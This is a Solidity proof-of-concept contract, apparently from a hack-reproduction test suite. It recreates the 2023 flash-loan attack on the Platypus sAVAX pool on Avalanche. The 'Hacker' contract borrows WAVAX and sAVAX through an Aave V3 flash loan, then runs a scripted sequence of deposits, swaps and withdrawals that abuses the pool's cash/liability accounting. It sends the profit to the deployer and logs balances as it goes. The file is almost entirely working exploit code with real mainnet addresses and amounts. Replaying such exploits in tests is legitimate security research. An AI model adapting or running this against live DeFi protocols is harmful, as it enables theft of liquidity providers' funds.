// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { console2 } from "@dev/forge-std/src/console2.sol";
import { WETH } from "@solady/tokens/WETH.sol";
import { FlashLoanReceiverBase } from "@aave/v3-core/flashloan/base/FlashLoanReceiverBase.sol";
import { IPoolAddressesProvider } from "@aave/v3-core/interfaces/IPoolAddressesProvider.sol";

/*
    https://snowtrace.io/tx/0xab5f6242fb073af1bb3cd6e891bc93d247e748a69e599a3744ff070447acb20f
    https://snowtrace.io/address/0xA2A7EE49750Ff12bb60b407da2531dB3c50A1789 #code

    forge test --match-path foundry/test/Hack/20231012-Platypus.t.sol -vvvvv
*/

interface IAavePool {
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata interestRateModes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    )
        external;
}

// https://github.com/platypus-finance/core
interface IPlatypusAsset {
    function balanceOf(address account) external view returns (uint256);
    function pool() external view returns (address);
    function underlyingToken() external view returns (address);
    function underlyingTokenBalance() external view returns (uint256);
    function cash() external view returns (uint256);
    function liability() external view returns (uint256);
    function totalSupply() external view returns (uint256);
}

// https://snowtrace.io/address/0x2b2c81e08f1af8835a78bb2a90ae924ace0ea4be
interface IBenqiSAVAX {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

interface IPlatypusPool {
    function assetOf(address token) external view returns (address);
    function deposit(
        address token,
        uint256 amount,
        address to,
        uint256 deadline
    )
        external
        returns (uint256 liquidity);
    function withdraw(
        address token,
        uint256 liquidity,
        uint256 minimumAmount,
        address to,
        uint256 deadline
    )
        external
        returns (uint256 amount);
    function swap(
        address fromToken,
        address toToken,
        uint256 fromAmount,
        uint256 minimumToAmount,
        address to,
        uint256 deadline
    )
        external
        returns (uint256 actualToAmount, uint256 haircut);
}

contract Hacker is FlashLoanReceiverBase {
    /*
        Platypus Pool sAVAX
        https://snowtrace.io/address/0x4658ea7e9960d6158a261104aaa160cc953bb6ba
        https://docs.platypus.finance/platypus-finance-docs/security-and-contracts/contract-addresses
    */
    IPlatypusPool private poolSAvax = IPlatypusPool(0x4658EA7e9960D6158a261104aAA160cC953bb6ba);
    IPlatypusAsset private poolAssetWAVAX;
    IPlatypusAsset private poolAssetSAVAX;
    /*
        Wrapped AVAX (WAVAX)
        https://snowtrace.io/address/0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7
    */

    WETH private WAVAX = WETH(payable(0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7));
    /*
        Staked AVAX (sAVAX)
        https://snowtrace.io/address/0x2b2c81e08f1af8835a78bb2a90ae924ace0ea4be
        https://vscode.blockscan.com/avalanche/0x0ce7f620eb645a4fbf688a1c1937bc6cb0cbdd29
    */
    IBenqiSAVAX private SAVAX = IBenqiSAVAX(payable(0x2b2C81e08f1Af8835a78Bb2A90AE924ACE0eA4bE));

    /*
        Aave: Pool V3 FlashLoan
        https://snowtrace.io/address/0x794a61358d6845594f94dc1db02a252b5b4814ad
    */
    IAavePool private aavePoolV3 = IAavePool(0x794a61358D6845594F94dc1DB02A252b5b4814aD);

    address[] private _assets;
    uint256[] private _amounts;
    uint256[] private _interestRateModes;
    // https://snowtrace.io/address/0xa97684ead0e402dC232d5A977953DF7ECBaB3CDb#code
    address private poolAddressesProvider = 0xa97684ead0e402dC232d5A977953DF7ECBaB3CDb;
    address private attacker;

    constructor() FlashLoanReceiverBase(IPoolAddressesProvider(poolAddressesProvider)) {
        poolAssetWAVAX = IPlatypusAsset(poolSAvax.assetOf(address(WAVAX)));
        poolAssetSAVAX = IPlatypusAsset(poolSAvax.assetOf(address(SAVAX)));
        console2.log("poolAssetWAVAX", address(poolAssetWAVAX), "poolAssetAVAX", address(poolAssetSAVAX));
        attacker = msg.sender;
        _log("constructor");
    }

    function attack() public payable {
        _log("Before_Attack1");
        uint256 _aaveWAVAX = WAVAX.balanceOf(address(aavePoolV3));
        uint256 _attackerWAVAX = WAVAX.balanceOf(address(this));
        uint256 _attackerSAVAX = SAVAX.balanceOf(address(this));
        uint256 _LP_WAVAX = WAVAX.balanceOf(address(poolAssetWAVAX));
        uint256 _LP_SAVAX = SAVAX.balanceOf(address(poolAssetSAVAX));

        SAVAX.approve(address(aavePoolV3), type(uint256).max);
        WAVAX.approve(address(aavePoolV3), type(uint256).max);
        SAVAX.approve(address(poolSAvax), type(uint256).max);
        WAVAX.approve(address(poolSAvax), type(uint256).max);

        // flashLoan
        _assets.push(address(WAVAX));
        _assets.push(address(SAVAX));
        _amounts.push(1_100_000 * 1e18);
        _amounts.push(991_589_030_408_934_949_444_991);
        _interestRateModes.push(0);
        _interestRateModes.push(0);
        _log("Before_flashLoan");
        aavePoolV3.flashLoan(address(this), _assets, _amounts, _interestRateModes, address(this), "", 0);
        _log("After_flashLoan");

        // deal attack profit
        poolSAvax.swap(address(SAVAX), address(WAVAX), 20_090 ether, 0, address(this), block.timestamp + 1000);
        WAVAX.withdraw(WAVAX.balanceOf(address(this)));

        _log("After_Attack");
        console2.log();
        console2.log("AAVE WAVAX Incr", (WAVAX.balanceOf(address(aavePoolV3)) - _aaveWAVAX) / 1e18);
        console2.log("Attacker WAVAX Incr", (WAVAX.balanceOf(address(this)) - _attackerWAVAX) / 1e18);
        console2.log("Attacker SAVAX Incr", (SAVAX.balanceOf(address(this)) - _attackerSAVAX) / 1e18);
        console2.log("LP_WAVAX WAVAX Decr", (_LP_WAVAX - SAVAX.balanceOf(address(poolAssetWAVAX))) / 1e18);
        console2.log("LP_WAVAX SAVAX Decr", (_LP_SAVAX - SAVAX.balanceOf(address(poolAssetSAVAX))) / 1e18);

        (bool isSuccess,) = msg.sender.call{ value: address(this).balance }("");
        require(isSuccess, "");
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata,
        address,
        bytes calldata
    )
        external
        override
        returns (bool)
    {
        uint256 dTime = block.timestamp + 1000;
        require(assets.length == 2, "assets not equal");
        _log("Enter_FlashLoan");

        poolSAvax.deposit(address(WAVAX), amounts[0], address(this), dTime);
        poolSAvax.deposit(address(SAVAX), amounts[1] / 3, address(this), dTime);
        _log("After_Deposit");

        (uint256 actualToAmount, uint256 haircut) =
            poolSAvax.swap(address(SAVAX), address(WAVAX), 600_000 ether, 0, address(this), dTime);
        _log("swap(SAVAX,WAVAX,600_000)");
        console2.log("poolSAvax.swap actualToAmount:%d haircut:%d", actualToAmount / 1e18, haircut / 1e18);

        uint256 amount = poolSAvax.withdraw(address(WAVAX), 1_020_000 ether, 0, address(this), dTime);
        _log("withdraw(WAVAX,1_020_000)");
        console2.log("poolSAvax.withdraw amount:%d ", amount / 1e18);

        (actualToAmount, haircut) =
            poolSAvax.swap(address(WAVAX), address(SAVAX), 1_400_000 ether, 0, address(this), dTime);
        _log("swap(WAVAX,SAVAX,1_400_000)");
        console2.log("poolSAvax.swap actualToAmount:%d haircut:%d", actualToAmount / 1e18, haircut / 1e18);

        amount = poolSAvax.withdraw(address(WAVAX), poolAssetWAVAX.balanceOf(address(this)), 0, address(this), dTime);
        _log("withdraw(WAVAX,poolAssetWAVAX.balanceOf(address(this)))");
        console2.log("poolSAvax.withdraw amount:%d ", amount / 1e18);

        (actualToAmount, haircut) =
            poolSAvax.swap(address(SAVAX), address(WAVAX), 700_000 ether, 0, address(this), dTime);
        _log("swap(SAVAX,WAVAX,700_000)");
        console2.log("poolSAvax.swap actualToAmount:%d haircut:%d", actualToAmount / 1e18, haircut / 1e18);

        amount = poolSAvax.withdraw(address(SAVAX), poolAssetSAVAX.balanceOf(address(this)), 0, address(this), dTime);
        _log("withdraw(SAVAX,poolAssetSAVAX.balanceOf(address(this)))");
        console2.log("poolSAvax.withdraw amount:%d ", amount / 1e18);

        (actualToAmount, haircut) =
            poolSAvax.swap(address(SAVAX), address(WAVAX), 70_000 ether, 0, address(this), dTime);
        _log("swap(SAVAX,WAVAX,70_000)");
        console2.log("poolSAvax.swap actualToAmount:%d haircut:%d", actualToAmount / 1e18, haircut / 1e18);

        return true;
    }

    function _log(string memory _msg) public view {
        console2.log();
        console2.log("-----------%s-----------", _msg);
        console2.log("Attacker Address: %s  AVAX: %d", attacker, address(this).balance / 1e18);
        console2.log(
            "Attacker WAVAX: %d SAVAX: %d", WAVAX.balanceOf(address(this)) / 1e18, SAVAX.balanceOf(address(this)) / 1e18
        );
        console2.log(
            "Platypus Assets WAVAX asset.totalSupply: %d , asset.cash: %d , asset.liability: %d",
            poolAssetWAVAX.totalSupply() / 1e18,
            poolAssetWAVAX.cash() / 1e18,
            poolAssetWAVAX.liability() / 1e18
        );
        console2.log(
            "Platypus Assets SAVAX asset.totalSupply: %d , asset.cash: %d , asset.liability: %d",
            poolAssetSAVAX.totalSupply() / 1e18,
            poolAssetSAVAX.cash() / 1e18,
            poolAssetSAVAX.liability() / 1e18
        );

        console2.log(
            "Platypus Assets Cash/liability WAVAX:%d Liability WAVAX:%d",
            poolAssetWAVAX.cash() * poolAssetWAVAX.liability() / 1e45,
            poolAssetSAVAX.cash() * poolAssetSAVAX.liability() / 1e45
        );
        console2.log(
            "Platypus Assets Cash WAVAX*SAVA:%d Liability WAVAX*SAVA:%d",
            poolAssetWAVAX.cash() * poolAssetSAVAX.cash() / 1e45,
            poolAssetWAVAX.liability() * poolAssetSAVAX.liability() / 1e45
        );
        console2.log("Attacker Platypus Pool LP-WAVAX", poolAssetWAVAX.balanceOf(address(this)) / 1e18);
        console2.log("Attacker Platypus Pool LP-sAVAX", poolAssetSAVAX.balanceOf(address(this)) / 1e18);
        // console2.log();
    }

    receive() external payable { }
}
